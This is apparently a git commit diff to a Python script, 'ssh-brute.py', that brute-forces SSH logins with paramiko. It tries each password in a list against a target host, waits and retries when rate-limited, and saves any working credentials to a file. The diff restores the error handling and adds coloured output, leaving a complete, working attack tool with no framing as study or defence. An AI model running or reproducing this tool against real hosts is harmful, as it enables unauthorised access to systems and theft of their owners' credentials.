c4ccf4639d83b3f7c30536766ae2806a3debe5f2
IvoryCoding <67837670+IvoryCoding@users.noreply.github.com>
2022-04-08 09:21:53 -0600

    added text files
    Goes through the specified password list and the credentials once it finds a match.

--- ssh-brute.py
+++ ssh-brute.py
@@ -3,30 +3,41 @@ import time
 import argparse
 import os
 import paramiko
+from colorama import init, Fore
 
-def is_ssh_open(hostname, user, password):
+init()
+
+BLUE = Fore.BLUE
+RESET = Fore.RESET
+RED = Fore.RED
+GREEN = Fore.GREEN
+
+
+def is_ssh_open(hostname, username, password):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     # Set out errors and display the correct messages
     try:
-        client.connect(hostname=hostname, username=user, password=password, timeout=3)
+        client.connect(hostname=hostname, username=username, password=password, timeout=3)
     except socket.timeout:
-        print(f"[!] Host {hostname} unreachable.")
+        print(f"{RED}[!] Host {hostname} unreachable.{RESET}")
         return False
-    #except AuthenticationException:
-        #print(f"[!] Credentials are invalid {user} : {password}")
-       #return False
-    #except SSHException:
-        #print(f"{BLUE}[*] Quota exceeded, retrying with delay... {RESET}")
-        
-        #time.sleep(60)
-        #return is_ssh_open(hostname, user, password)
+    except paramiko.AuthenticationException:
+        print(f"[!] Credentials are invalid {username} : {password}")
+        return False
+    except paramiko.SSHException:
+        print(f"{BLUE}[*] Quota exceeded, retrying with delay... {RESET}")
+
+        time.sleep(60)
+        return is_ssh_open(hostname, username, password)
     else:
-        print(f"[+] Found credentials:\n\tHostname: {hostname}\n\tUsername: {user}\n\tPassword: {password}")
+        print(
+            f"{GREEN}[+] Found credentials:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
         return True
 
+
 if __name__ == "__main__":
-    # Set the arguements
+    # Set the arguments
     parse = argparse.ArgumentParser(description="SSH Bruteforce Python Script.")
     parse.add_argument("host", help="Host name or IP address to brute force SSH")
     parse.add_argument("-P", "--passlist", help="File that contain password list in each line.")
@@ -42,6 +53,6 @@ if __name__ == "__main__":
 
     # Brute Force
     for password in passList:
-        if (is_ssh_open(host, user, password)):
+        if is_ssh_open(host, user, password):
             # If valid save to file
             open("credentials.txt", "w").write(f"{user}@{host}:{password}")
